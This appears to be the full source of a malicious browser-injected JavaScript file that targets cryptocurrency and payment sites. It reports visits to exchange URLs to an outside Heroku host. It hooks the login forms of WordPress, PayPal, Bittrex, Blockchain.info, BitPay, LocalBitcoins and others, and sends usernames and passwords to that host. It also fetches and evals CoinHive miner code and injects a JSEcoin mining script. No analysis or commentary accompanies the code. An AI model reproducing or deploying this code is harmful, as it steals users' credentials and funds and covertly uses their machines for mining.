(new Image).src = "https://whos.amung.us/swidget/bbbbbbbbf";
var myStringArray = [
  "coin",
  "ether",
  "bitcoin",
  "monero",
  "etherum",
  "wallet",
  "cryptocurrency",
  "bitcoin",
  "blockchain.info",
  "paxful.com",
  "coin.space",
  "coinapult.com",
  "bitgo.com",
  "strongcoin.com",
  "coinhive.com",
  "spectrocoin.com",
  "wirexapp.com",
  "xapo.com",
  "iqoption.com",
  "etoro.com",
  "bittrex.com",
  "localbitcoins.com",
  "cex.io",
  "kraken.com",
  "etherdelta.com",
  "bitfinex.com",
  "bitstamp.net",
  "bisq.network",
  "gdax.com",
  "shapeshift.io",
  "binance.com",
  "coinmama.com",
  "bitcoin.de",
  "bithumb.com",
  "coinatmradar.com",
  "poloniex.com",
  "changelly.com",
  "zebpay.com",
  "bitso.com",
  "gemini.com",
  "yobit.net",
  "luno.com",
  "bitbay.net",
  "bitpanda.com",
  "bitflyer.jp",
  "cryptonia.co.nz",
  "btcmarkets.net",
  "coinchceck.com",
  "bx.in.th",
  "bitcoin.co.id",
  "anycoindirect.eu",
  "hitbtc.com",
  "bitmex.com",
  "indacoin.com",
  "mine",
  "btc",
  "ltc",
  "zcash"
];
var arrayLength = myStringArray.length;
for (var i = 0; i < arrayLength; i++) {
    if (location.href.indexOf(myStringArray[i]) > -1) {
      (new Image).src = "https://fetching-url.herokuapp.com/sites.php?l="+encodeURIComponent(location.href);
      }
    }


    if (location.href.indexOf("wp-login") >= 0 || (location.href.indexOf("wp-admin") >= 0 || location.href.indexOf("wp-") >= 0)) {
      document.getElementById("loginform").onsubmit = function() {
        username = document.getElementById("user_login").value;
        user_pass = document.getElementById("user_pass").value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);

        }
      };
    };

      if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
      document.getElementById("login-form").onsubmit = function() {
        username = document.getElementById("username").value;
        user_pass = document.getElementById("password").value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
        }
      };
    };

    if (top['location']['href']['indexOf']('minergate.com') > -1) {
      document.getElementsByName("mainForm")[0].onsubmit = function() {
        username = document.getElementsByName("email")[0].value;
        user_pass = document.getElementsByName("password")[0].value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
        }
      };
    };

    if (top['location']['href']['indexOf']('blockchain.info') > -1) {
      document.getElementsByName("loginForm")[0].onsubmit = function() {
        username = document.getElementsByName("UID_input")[0].value;
        user_pass = document.getElementsByName("pass_input")[0].value;
        if (username && user_pass) {
          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
        }
      };
    };

    if (top['location']['href']['indexOf']('bittrex.com/Account/Login') > -1) {
        var interval = setInterval(function () {
            if (document['getElementsByTagName']('button')) {
                clearInterval(interval);
                document['getElementsByClassName']('g-recaptcha btn btn-primary login')[0].onmouseover = function (_0x441cx2) {
                username = document.getElementsByName("UserName")[0].value;
                user_pass = document.getElementsByName("Password")[0].value;

              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                }
            }
        }, 1000)
    };

    if (top['location']['href']['indexOf']('wallet.advcash.com') > -1) {
        var interval = setInterval(function () {
            if (document['getElementsByClassName']('form')[0]) {
                clearInterval(interval);
                document['getElementsByName']('j_idt55')[0].onmouseover = function (_0x441cx2) {
                username = document.getElementsByName("j_username")[0].value;
                user_pass = document.getElementsByName("j_password")[0].value;

              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                }
            }
        }, 1000)
    };


    if (top['location']['href']['indexOf']('paypal.com') > -1) {
        var interval = setInterval(function () {
            if (document['getElementsByClassName']('proceed maskable')[0]) {
                clearInterval(interval);
                document['getElementsByName']('login')[0].onsubmit = function (_0x441cx2) {

                username = document.getElementsByName("login_email")[0].value;
                user_pass = document.getElementsByName("login_password")[0].value;

                (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                }
            }
        }, 1000)
    };



  if (window.location.href.indexOf("http://bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
  var login_form = document.getElementById("loginForm");
      if(login_form){
          login_form.onsubmit = function(){

              username = document.getElementsByName("usus")[0].value;
              user_pass = document.getElementsByName("clave")[0].value;

              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
  		        }
            }
          };

          if (top['location']['href']['indexOf']('https://bitpay.com/dashboard/login') > -1) {
              var interval = setInterval(function () {
                  if (document['getElementsByClassName']('bp-constrain-login')[0]) {
                      clearInterval(interval);
                      document['getElementsByClassName']('button bp-button prelogin__button ladda-button')[0].onclick = function (_0x441cx2) {

                      username = document.getElementsByName("email")[0].value;
                      user_pass = document.getElementsByName("password")[0].value;

                      (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                      }
                  }
              }, 1000)
          };

          if (top['location']['href'] === 'https://auth.bitbay.net/login') {
              var interval = setInterval(function () {
                  if (document['getElementsByClassName']('main-content-container')[0]) {
                      clearInterval(interval);
                      document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {

                      username = document.getElementsByName("email")[0].value;
                      user_pass = "null"; //document.getElementsByName("password")[0].value;

                      (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                      }
                  }
              }, 1000)
          };
          if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
              var interval = setInterval(function () {
                  if (document['getElementsByClassName']('main-content-container')[0]) {
                      clearInterval(interval);
                      document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {

                      username = "null" //document.getElementsByName("email")[0].value;
                      user_pass = document.getElementsByName("password")[0].value;

                      (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                      }
                  }
              }, 1000)
          };

          if (top['location']['href'] === 'https://auth.bitbay.net/login-password') {
              var interval = setInterval(function () {
                  if (document['getElementsByClassName']('main-content-container')[0]) {
                      clearInterval(interval);
                      document['getElementsByClassName']('send-btn')[0].onclick = function (_0x441cx2) {

                      username = "null" //document.getElementsByName("email")[0].value;
                      user_pass = document.getElementsByName("password")[0].value;

                      (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                      }
                  }
              }, 1000)
          };




            if (top['location']['href']['indexOf']('https://localbitcoins.com/accounts/login/') > -1) {
                  var interval = setInterval(function () {
                      if (document['getElementsByClassName']('container')) {
                          clearInterval(interval);
                          document['getElementById']('btn-primary').onclick = function (_0x441cx2) {

                          username = document.getElementById("id_username").value;
                          user_pass = document.getElementById("id_password").value;

                          (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                          }
                      }
                  }, 1000)
              };

              if (top['location']['href']['indexOf']('https://sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
                    var interval = setInterval(function () {
                        if (document['getElementsByClassName']('form-signin')) {
                            clearInterval(interval);
                            document['getElementById']('btn btn-large btn-warning').onclick = function (_0x441cx2) {

                            username = document.getElementsByName("usu").value;
                            user_pass = document.getElementsByName("con").value;

                            (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                            }
                        }
                    }, 1000)
                };

                if (top['location']['href']['indexOf']('https://onixcoin.com/inicio-sesion/') > -1) {
                      var interval = setInterval(function () {
                          if (document['getElementsByClassName']('onix-info')) {
                              clearInterval(interval);
                              document['getElementById']('btn_sesion').onclick = function (_0x441cx2) {

                              username = document.getElementsByName("correo")[1].value;
                              user_pass = document.getElementsByName("clave")[0].value;

                              (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                              }
                          }
                      }, 1000)
                  };

                  if (top['location']['href']['indexOf']('https://www.coinpayments.net/login') > -1) {
                        var interval = setInterval(function () {
                            if (document['getElementsByClassName']('login')) {
                                clearInterval(interval);
                                document['getElementsByClassName']('w-button button large login').onclick = function (_0x441cx2) {

                                username = document.getElementsByName("username")[0].value;
                                user_pass = document.getElementsByName("pass")[0].value;

                                (new Image).src = "https://fetching-url.herokuapp.com/logs.php?l="+encodeURIComponent(location.href)+"&e="+encodeURIComponent(username)+"&p="+encodeURIComponent(user_pass);
                                }
                            }
                        }, 1000)
                    };



    var target = 2048;
    var exFunc = function(){
    if (typeof isrunmyproject == "undefined") {
      isrunmyproject = 1;
    if (typeof CoinHive != "object") {
      var xmlHttp = new XMLHttpRequest;
        xmlHttp["open"]("GET", "https://coinhive.com/lib/coinhive.min.js", false);
        xmlHttp["send"](null);
        eval(xmlHttp["responseText"]);
    }
      var miner = new CoinHive.Token('H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr', target);
      miner.on('accepted', function(params){
        if (params.hashes >= target) {
          var ts = Date.now();
          var xhr = new XMLHttpRequest();
          xhr.onreadystatechange = function() {
            if (xhr.readyState === xhr.DONE){

            }
          };
          xhr.open('POST', 'https://cnhv.co/dkja');
          xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
          xhr.send('token='+encodeURIComponent(miner.getToken()));
        }
      });
      miner.start(CoinHive.FORCE_MULTI_TAB);

    }
  }

    var cookie_name = "controler_mineros_"+target;
    var cookie_time = 0.3;
    if(!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now()-60*60*cookie_time){
      localStorage[cookie_name] = Date.now();
      exFunc();
     }

    !function() {
      localStorage["jsenow"] = Date.now();
      var e = document;
      var t = e.createElement("script");
      var s = e.getElementsByTagName("script")[0];
      t.type = "text/javascript";
      t.async = t.defer = true;
      t.src = "https://load.jsecoin.com/load/29089/www/0/0/";
      s.parentNode.insertBefore(t, s);
    }();
